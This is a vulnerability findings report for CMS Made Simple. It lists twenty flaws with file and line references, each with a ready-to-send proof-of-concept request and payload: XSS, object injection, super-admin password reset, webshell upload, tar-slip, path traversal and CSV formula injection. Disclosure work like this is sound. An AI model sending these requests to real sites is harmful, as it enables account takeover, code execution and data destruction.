# CMS Made Simple — Confirmed Security Findings

Notes: `TARGET` = site host. `KEY` = victim admin's `__c` session token (present in every admin URL).
Frontend module params are prefixed `cntnt01`; admin module params are prefixed `m1_`.

---

## 1. Stored XSS — News front-end submission (unauthenticated)
- **Name:** Stored Cross-Site Scripting (CWE-79)
- **File:** `modules/News/action.fesubmit.php` (`__newsCleanHTML` only strips `<script>`/`script:`); rendered raw by `{$entry->content}`/`{$entry->summary}`
- **URL:**
  ```
  https://TARGET/index.php?mact=News,cntnt01,fesubmit,0&cntnt01submit=1&cntnt01title=hi&cntnt01content=<img src=x onerror=alert(document.cookie)>&cntnt01summary=<svg onload=alert(1)>
  ```
- **Payload:** `<img src=x onerror=alert(document.cookie)>`
- **Description:** When the admin enables `allow_fesubmit`, an anonymous user submits News content whose event-handler payload survives the weak sanitizer and executes when the article is viewed. Config-gated (needs feature on + article published/approved).

---

## 2. Stored/Self XSS + Open Redirect — Bookmarks
- **Name:** Stored XSS (CWE-79) + Open Redirect (CWE-601)
- **File:** `admin/makebookmark.php:35,40` (raw `$_GET['title']` stored; `$_GET['ref']` base64→`Location:`); `admin/listbookmarks.php:76-77` echoes raw
- **URL (store):**
  ```
  https://TARGET/admin/makebookmark.php?__c=KEY&title=<img src=x onerror=alert(document.cookie)>&ref=ZXZpbC5jb20=
  ```
- **URL (fires):** `https://TARGET/admin/listbookmarks.php?__c=KEY`
- **Payload:** title=`<img src=x onerror=alert(document.cookie)>` ; ref=`ZXZpbC5jb20=` (base64 `evil.com` → redirect to `//evil.com`)
- **Description:** Bookmark title stored without sanitization and echoed raw on the list page; `ref` produces a protocol-relative open redirect. Requires the session key (self-XSS).

---

## 3. Reflected XSS — MicroTiny file picker
- **Name:** Reflected Cross-Site Scripting (CWE-79)
- **File:** `modules/MicroTiny/action.filepicker.php` (raw `$_GET['field']`, `$_GET['subdir']`); `templates/filepicker.tpl:111` (`field_id:'{$field}'`, JS context) and `:36` (`{$startpath}`, HTML context)
- **URL:**
  ```
  https://TARGET/admin/moduleinterface.php?mact=MicroTiny,m1_,filepicker,0&__c=KEY&showtemplate=false&field=x';alert(document.cookie);//
  ```
- **Payload:** `field=x';alert(document.cookie);//` (JS breakout) or `subdir=</p><svg onload=alert(1)>`
- **Description:** Unsanitized `field`/`subdir` reflected into JS-string and HTML contexts in the file-picker popup. Requires admin login + session key.

---

## 4. Reflected XSS — Event Manager
- **Name:** Reflected Cross-Site Scripting (CWE-79)
- **File:** `admin/eventhandlers.php:74-75` (raw `$_GET['event']`/`$_GET['module']` echoed; also into `href`s)
- **URL:**
  ```
  https://TARGET/admin/eventhandlers.php?__c=KEY&action=showeventhelp&module=Core&event=<script>alert(document.cookie)</script>
  ```
- **Payload:** `event=<script>alert(document.cookie)</script>`
- **Description:** `event`/`module` GET params echoed unescaped in the event-help view. Requires admin login + session key.

---

## 5. PHP Object Injection — CMSContentManager bulk actions
- **Name:** Insecure Deserialization / PHP Object Injection (CWE-502)
- **File:** `modules/CMSContentManager/action.admin_bulk_delete.php:87,124` (also `admin_bulk_active`, `admin_bulk_secure`, `admin_bulk_cachable`, `admin_bulk_showinmenu`, `admin_bulk_changeowner`, `admin_bulk_setdesign`, `admin_multicontent`); `modules/UserGuide/lib/class.UserGuideImporterExporter.php:276,298`
- **URL:**
  ```
  POST https://TARGET/admin/moduleinterface.php?__c=KEY
  mact=CMSContentManager,m1_,admin_bulk_delete,0&m1_submit=1&m1_confirm1=1&m1_confirm2=1&m1_multicontent=<base64(serialize($object))>
  ```
- **Payload:** `m1_multicontent = base64_encode(serialize($craftedObject))`
- **Description:** `unserialize(base64_decode($params['multicontent']))` on an unsigned request param instantiates attacker-chosen objects (POP-gadget entry point). Authenticated; needs content-management access.

---

## 6. Broken Access Control (IDOR) — bulk page delete
- **Name:** Missing Function-Level Authorization / IDOR (CWE-862 / CWE-639)
- **File:** `modules/CMSContentManager/action.admin_bulk_delete.php:93-99` (delete loop never calls `cmscm_admin_bulk_delete_can_delete()`; authorship checked only in the preview at `:62`)
- **URL:**
  ```
  POST https://TARGET/admin/moduleinterface.php?__c=KEY
  mact=CMSContentManager,m1_,admin_bulk_delete,0&m1_action=admin_bulk_delete&m1_submit=1&m1_confirm1=1&m1_confirm2=1&m1_multicontent=YTo1OntpOjA7aToyO2k6MTtpOjM7aToyO2k6NDtpOjM7aTo1O2k6NDtpOjY7fQ==
  ```
- **Payload:** `m1_multicontent = base64(serialize([2,3,4,5,6]))` — arbitrary page IDs the user does not own
- **Description:** Per-page authorship is enforced on the confirmation preview but not on execution; a user with only "Remove Pages" can delete any page (except default home) by tampering `multicontent`. Site-wide content destruction / DoS.

---

## 7. Unauthenticated cron trigger — CmsJobManager
- **Name:** Missing Authentication for Critical Function (CWE-306)
- **File:** `modules/CmsJobManager/action.process.php:3` (gated only by `isset($_REQUEST['cms_cron'])`)
- **URL:**
  ```
  https://TARGET/index.php?mact=CmsJobManager,cntnt01,process,0&cms_cron=1
  ```
- **Payload:** `cms_cron=1`
- **Description:** Async job-queue processing can be triggered by anyone with no login or shared secret (self-throttled by a timestamp, so not raw DoS).

---

## 8. Unrestricted File Upload — FileManager (inconsistent validation)
- **Name:** Unrestricted Upload of File with Dangerous Type (CWE-434)
- **File:** `modules/FileManager/action.upload.php:23-31` (`is_file_acceptable` blocks only extensions that `startswith('php')`/`endswith('php')`); base handler `lib/class.jquery_upload_handler.php:27` uses `accept_file_types => /.+$/i`. Does not use FilePicker's allowlist (`FilePicker::is_acceptable_filename`).
- **URL:**
  ```
  POST https://TARGET/admin/moduleinterface.php?mact=FileManager,m1_,upload,0&__c=KEY
  (multipart/form-data with m1_files[] = shell.phtml)
  ```
- **Payload:** upload `shell.phtml` / `shell.pht` / `shell.phar`, or an `.htaccess` that maps a benign extension to the PHP handler, then the payload
- **Description:** FileManager's upload gate is a blocklist that misses `.phtml`, `.pht`, `.phar`, and `.htaccess`; it ignores the strict per-profile allowlist FilePicker implements. `uploads/` has no execution restriction, so on Apache configs that map those extensions this yields RCE. Authenticated (Modify Files); blocklist also skipped entirely when `developer_mode` is on.

---

## 9. Privilege Escalation — user management ignores super-admin protection
- **Name:** Broken Access Control / Privilege Escalation (CWE-269 / CWE-639)
- **File:** `admin/edituser.php:61-62` (`$access_group` computed but never enforced in the save path at `:76-141`); `admin/deleteuser.php:34-62` (no group-1 check)
- **URL:**
  ```
  POST https://TARGET/admin/edituser.php?__c=KEY
  user_id=1&user=admin&password=Pwned123!&passwordagain=Pwned123!&email=&submit=1
  ```
- **Payload:** `user_id=1` (the super-admin, group 1) + a new `password`/`passwordagain`
- **Description:** A user holding only "Manage Users" (meant to be delegatable to non-super-admins) can edit any account including a group-1 super-admin and reset its password → full account takeover. The `$access_group` guard that should block editing super-admins is computed but never checked. `deleteuser.php` likewise lets a Manage-Users operator delete super-admin accounts (only self-delete and page-ownership are blocked).

---

## 10. Tar-Slip — arbitrary file write via archive extraction
- **Name:** Path Traversal / Arbitrary File Write on Extraction (CWE-22 / CWE-434)
- **File:** `modules/FileManager/easyarchives/EasyTar.class.php:60-78` (entry `name` concatenated to `$dest` with no `../` sanitization); reached via `modules/FileManager/action.unpack.php:34` → `EasyArchive::extract` (tar/gz/bz2 path; zip uses safe `ZipArchive::extractTo`)
- **URL:**
  ```
  1) upload evil.tar via  POST .../moduleinterface.php?mact=FileManager,m1_,upload,0&__c=KEY
  2) POST https://TARGET/admin/moduleinterface.php?mact=FileManager,m1_,unpack,0&__c=KEY  (select evil.tar)
  ```
- **Payload:** a `.tar`/`.tar.gz` whose entry name is `../../shell.php` with PHP contents (climb out of uploads into webroot)
- **Description:** The custom tar extractor writes each entry to `$dest.$name` without confining to the destination, so a traversal entry name writes anywhere the web user can. Bypasses the upload extension filter (the archive itself is benign) → webshell → RCE. Authenticated (Modify Files).

---

## 11. Privilege Escalation — arbitrary permission grant (group permissions)
- **Name:** Privilege Escalation / Improper Authorization (CWE-269)
- **File:** `admin/changegroupperm.php:175-187` (insert loop grants `pg_<permId>_<groupId>` with no check that the actor holds that permission; only `group_id != '1'` is blocked)
- **URL:**
  ```
  POST https://TARGET/admin/changegroupperm.php?__c=KEY
  submitted=1&pg_<PERM_ID>_<MY_GROUP_ID>=1
  ```
- **Payload:** `pg_<perm_id_of_"Modify User-defined Tags">_<attacker_group_id>=1` (any non-1 group)
- **Description:** A user with only "Manage Groups" can grant any permission to any non-super-admin group, including their own, with no requirement to already hold it. Granting "Modify User-defined Tags" or "Modify Templates" yields RCE; granting "Manage Users" chains to finding #9. Effectively becomes a super-admin. Only literal membership of group 1 is blocked.

---

## 12. Path Traversal — FileManager newdir / copy escape the uploads sandbox
- **Name:** Path Traversal (CWE-22)
- **File:** `modules/FileManager/action.newdir.php:20` (`$params['path']` used unvalidated); `modules/FileManager/action.copy.php:36,46` (`$params['destdir']`/`$params['destname']` unvalidated, no `test_valid_path`)
- **URL:**
  ```
  POST https://TARGET/admin/moduleinterface.php?mact=FileManager,m1_,newdir,0&__c=KEY
  m1_path=../../&m1_newdirname=evil&m1_submit=1
  ```
- **Payload:** `m1_path=../../` (newdir) or `m1_destdir=../../` / `m1_destname=../shell.phtml` (copy)
- **Description:** `newdir` builds the target from the client `path` param without `test_valid_path`, and `copy` uses client `destdir`/`destname` the same way, so directories can be created and files copied outside the uploads directory. Authenticated (Modify Files).

---

## 13. Missing Authorization — FilePicker ajax file commands
- **Name:** Missing Authorization / Broken Access Control (CWE-862)
- **File:** `modules/FilePicker/action.ajax_cmd.php` (no `CheckPermission`; mkdir/del/upload gated only by profile flags; default profile has `can_upload`/`can_delete`/`can_mkdir` all enabled per `lib/classes/class.FilePickerProfile.php:49-50`); mkdir `val` allows mid-path `../`
- **URL:**
  ```
  POST https://TARGET/admin/moduleinterface.php?mact=FilePicker,m1_,ajax_cmd,0&__c=KEY
  cmd=mkdir&cwd=&val=foo/../../../evil
  ```
- **Payload:** `cmd=mkdir&val=foo/../../evil` (traversal), or `cmd=del&val=<file>`, or `cmd=upload`
- **Description:** The action performs no permission check, so any authenticated admin — even one without "Modify Files" — can create/delete/upload files via the always-permissive default profile. The `mkdir` value is not `basename()`-restricted (unlike `del`), so a mid-path `../` creates directories outside the sandbox.

---

## 14. CSV / Formula Injection — Search word export (unauthenticated seed)
- **Name:** CSV Formula Injection (CWE-1236)
- **File:** `modules/Search/action.defaultadmin.php:29` (word written to CSV with no formula-escaping and no quote-doubling); words are seeded by unauthenticated frontend search via `action.dosearch.php`
- **URL:**
  ```
  seed  (unauth): https://TARGET/index.php?mact=Search,cntnt01,dosearch,0&cntnt01searchinput==cmd|'/c calc'!A1
  export (admin): https://TARGET/admin/moduleinterface.php?mact=Search,m1_,defaultadmin,0&__c=KEY&m1_exportcsv=1
  ```
- **Payload:** search for `=cmd|'/c calc'!A1` or `=HYPERLINK("http://evil/")` (stored as a search word)
- **Description:** Anonymous users seed `module_search_words`; when a "Manage Search" admin exports the stats to `search.csv` and opens it in a spreadsheet, a leading `=`/`+`/`-`/`@` value executes as a formula. Embedded `"` is also not doubled, breaking CSV field quoting.

---

## 15. IDOR — bookmarks lack ownership checks
- **Name:** Insecure Direct Object Reference (CWE-639)
- **File:** `admin/deletebookmark.php:30-42` (loads and deletes by `bookmark_id` with no owner check); `admin/editbookmark.php:59-67` (saves by client `bookmark_id`, reassigning `user_id` to the actor)
- **URL:**
  ```
  https://TARGET/admin/deletebookmark.php?__c=KEY&bookmark_id=<victim_bookmark_id>
  ```
- **Payload:** `bookmark_id` belonging to another user
- **Description:** Any admin can delete another user's bookmark by ID, or via `editbookmark` overwrite another user's bookmark and reassign it to themselves — neither verifies the bookmark belongs to the current user. Low impact (per-user bookmarks).

---

## 16. Mass Assignment → Privilege Escalation in content editing (page ownership/editors)
- **Name:** Mass Assignment / Broken Access Control (CWE-915 / CWE-639)
- **File:** `lib/classes/class.ContentBase.php:1833-1845` (`FillParams` applies `ownerid` → `SetOwner` and `additional_editors` → `SetAdditionalEditors` with no permission check); invoked unconditionally at `modules/CMSContentManager/action.admin_editcontent.php:184` for anyone passing `CanEditContent()` (which includes non-owner **additional editors** via `author_pages`, `CMSContentManager.module.php:59-68`)
- **URL:**
  ```
  POST https://TARGET/admin/moduleinterface.php?mact=CMSContentManager,m1_,admin_editcontent,0&__c=KEY
  m1_content_id=<page_you_can_edit>&ownerid=<your_uid>&additional_editors[]=<your_uid>&m1_submit=1
  ```
- **Payload:** raw (unprefixed) `ownerid=<uid>` and `additional_editors[]=<uid>` added to the POST (`FillParams` reads them straight from `$_POST`)
- **Description:** A user who can edit a page only as an *additional editor* (the lowest content privilege, and not "Manage All Content"/"Modify Any Page") can POST `ownerid` to make themselves the page **owner**, and rewrite the `additional_editors` list. The UI hides these controls for non-owners (`action.admin_editcontent.php:292`) but the server applies them anyway. Result: additional-editor → page owner takeover (unlocks owner-only actions, e.g. content-type change and delete-via-authorship), plus arbitrary reassignment of page ownership. `active`/`secure`/`page_url` are similarly settable without a per-field check.

---

## 17. Stored XSS — page menu text breaks out of breadcrumb title attribute (frontend)
- **Name:** Stored Cross-Site Scripting (CWE-79)
- **File:** input filter only `strip_tags` at `lib/classes/class.ContentBase.php` FillParams (`mMenuText = strip_tags(trim($params['menutext']))`); output unescaped in an HTML attribute at `modules/Navigator/templates/dflt_breadcrumbs.tpl:17` (`title="{$node->menutext}"`). Core `{menu_text}` plugin also outputs raw (`lib/plugins/function.menu_text.php`).
- **URL:**
  ```
  set (content editor): POST .../moduleinterface.php?mact=CMSContentManager,m1_,admin_editcontent,0&__c=KEY
                        m1_content_id=<page>&menutext=" onmouseover="alert(document.cookie)&m1_submit=1
  fire (any visitor):   browse any frontend page that renders breadcrumbs
  ```
- **Payload:** menu text = `" onmouseover="alert(document.cookie)`
- **Description:** `strip_tags` removes tags but leaves `"` and event-handler text, so menu text set by any content editor (including a non-owner additional editor) breaks out of the breadcrumb link's `title="..."` attribute, injecting an `onmouseover` handler that executes for any site visitor who hovers the breadcrumb — a stored XSS seeded from the admin side and fired on the public frontend. The output-encoding asymmetry (`{title}` HTML-encodes, `{menu_text}` does not) is the root cause; attribute-context templates make it exploitable despite the input filter.

---

## 18. Stored XSS (zero-click) — unsanitized content properties (image / extra fields)
- **Name:** Stored Cross-Site Scripting (CWE-79)
- **File:** no input filter on `image`/`thumbnail`/`extra1`/`extra2`/`extra3` — `lib/classes/class.ContentBase.php` FillParams does `SetPropertyValue($oneparam, $params[$oneparam])` with no `strip_tags`/encoding; raw output in an `<img src>`/`alt` at `lib/plugins/function.page_image.php:52-61`, and raw text via `lib/plugins/function.page_attr.php:89` (`{page_attr key='extra1'}`).
- **URL:**
  ```
  set (content editor): POST .../moduleinterface.php?mact=CMSContentManager,m1_,admin_editcontent,0&__c=KEY
                        m1_content_id=<page>&image=x" onerror="alert(document.cookie)&m1_submit=1
  fire (any visitor):   browse any frontend page whose template uses {page_image tag=1} (or {page_attr key='extra1'})
  ```
- **Payload:** image = `x" onerror="alert(document.cookie)` → renders `<img src="x" onerror="alert(document.cookie)"/>`; or extra1 = `<script>alert(document.cookie)</script>`
- **Description:** Unlike name/menutext/titleattribute (which at least get `strip_tags`), the `image`, `thumbnail`, and `extra1-3` content properties are stored completely raw. `{page_image tag=1}` inlines the `image` value into `src="..."` unescaped → an `onerror` payload gives a **zero-click** stored XSS on the public frontend for every visitor; `{page_attr key='extra1'}` emits `extra*` raw so `<script>` works directly. Settable by any content editor (including a non-owner additional editor) on any page they can edit.

---

## 19. Stored XSS — "Link" content-type URL (javascript: URI / attribute breakout)
- **Name:** Stored Cross-Site Scripting (CWE-79 / CWE-83)
- **File:** `lib/classes/contenttypes/Link.inc.php:57-63` (`url` property set from `$params['url']`/`file_url` with no filter) and `:113-116` (`GetURL()` returns the value raw — the `cms_htmlentities` line is commented out); rendered unescaped as `href="{$node->url}"` in the shipped nav templates (e.g. `modules/Navigator/templates/cssmenu.tpl:59`, `simple_navigation.tpl:52`, `minimal_menu.tpl:40`).
- **URL:**
  ```
  create a "Link" page: POST .../moduleinterface.php?mact=CMSContentManager,m1_,admin_editcontent,0&__c=KEY
                        m1_content_type=link&title=Evil&url=javascript:alert(document.cookie)&m1_submit=1
  fire (any visitor):   click the menu entry (javascript:) — or use url=`x" onmouseover="alert(1)` for attribute breakout
  ```
- **Payload:** `url=javascript:alert(document.cookie)` or `url=x" onmouseover="alert(1)`
- **Description:** The Link content type stores its target URL with no sanitization and `GetURL()` deliberately returns it unescaped (encoding commented out). Navigation menus render it directly into an `href`, so a content editor with "Add Pages" can plant a menu link that runs script when clicked (`javascript:` URI) or on hover (attribute breakout) — stored XSS on the public frontend.

---

## 20. Stored XSS — uploaded filename rendered unescaped in FileManager listing
- **Name:** Stored Cross-Site Scripting (CWE-79)
- **File:** `modules/FileManager/action.admin_fileview.php:101,123` (raw filename `$link` placed as link-text HTML) and `:166` (`alt="'.$file->name.'"`); upload sanitization `modules/FileManager/lib/class.jquery_upload_handler.php` `trim_file_name` only `basename()`s and trims bytes `.\x00..\x20` from the ends (leaves `<`, `>`, `"`), and `action.upload.php` blocks only `php*` extensions.
- **URL:**
  ```
  upload (Modify Files, or FilePicker ajax_cmd #13 which needs no file perm):
    POST .../moduleinterface.php?mact=FileManager,m1_,upload,0&__c=KEY  (multipart)
    filename = <img src=x onerror=alert(document.cookie)>.txt
  fire: any admin opens FileManager on that directory
    https://TARGET/admin/moduleinterface.php?mact=FileManager,m1_,defaultadmin,0&__c=KEY
  ```
- **Payload:** upload a file named `<img src=x onerror=alert(document.cookie)>.txt`
- **Description:** Uploaded filenames retain HTML metacharacters and are embedded raw into the file-list row HTML (link text and image `alt`), so a maliciously named file stored by a low-privilege uploader executes script in the browser of any administrator who later browses that folder — a stored XSS that crosses from a file-upload user to full admins.
